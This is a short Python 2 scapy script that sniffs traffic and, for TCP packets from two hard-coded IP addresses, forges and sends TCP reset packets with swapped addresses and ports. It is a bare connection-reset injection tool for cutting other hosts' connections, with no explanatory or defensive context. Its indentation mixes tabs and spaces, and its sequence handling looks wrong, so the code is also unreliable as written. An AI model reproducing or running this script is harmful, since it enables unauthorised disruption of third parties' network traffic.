#http://demo.weborion.in/infostretch/wp-content/uploads/2014/09/IS-Logo.png
from scapy.all import *
def print_summary(pkt):
    #if IP in pkt:
		
    if (TCP in pkt and (pkt[IP].src == "74.125.228.53" or pkt[IP].src == "173.194.125.83")):
	rstpkt=IP()/TCP()
	sip = pkt[IP].src
	dip = pkt[IP].dst

	rstpkt[IP].src= dip
	rstpkt[IP].dst= sip

        tcp_sport=pkt[TCP].sport
        tcp_dport=pkt[TCP].dport
	rstpkt[TCP].sport = tcp_dport
	rstpkt[TCP].dport = tcp_sport
	#pkt[TCP].ack = pkt[TCP].ack+1	
	rstpkt[TCP].flags=4
	rstpkt[TCP].seq=pkt[TCP].seq
	

	sr(rstpkt)
	print rstpkt.summary()
	#print (pkt)
	
	#print ls(pkt)

sniff(filter="ip",prn=print_summary)
